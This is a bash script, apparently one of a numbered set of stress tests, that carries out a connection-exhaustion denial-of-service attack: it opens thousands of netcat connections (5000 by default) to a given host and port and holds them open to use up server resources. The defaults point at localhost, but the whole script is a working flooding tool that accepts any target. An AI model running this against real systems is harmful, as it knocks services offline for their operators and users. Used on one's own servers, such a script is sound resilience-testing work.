#!/bin/bash
# Attack 1: Connection Exhaustion
# Opens many connections to exhaust server resources

HOST=${1:-localhost}
PORT=${2:-9009}
CONNECTIONS=${3:-5000}

echo "🚨 Connection Exhaustion Attack"
echo "Target: $HOST:$PORT"
echo "Connections: $CONNECTIONS"
echo ""
echo "Opening $CONNECTIONS connections..."

for i in $(seq 1 $CONNECTIONS); do
    # Open connection and hold it
    (nc $HOST $PORT & sleep 0.01) &
    
    # Show progress every 100 connections
    if [ $((i % 100)) -eq 0 ]; then
        echo "Opened $i connections..."
    fi
done

echo ""
echo "All connections opened!"
echo "Monitor with: ss -tan | grep $PORT | wc -l"
echo "Press Ctrl+C to close all connections"

# Wait indefinitely
wait
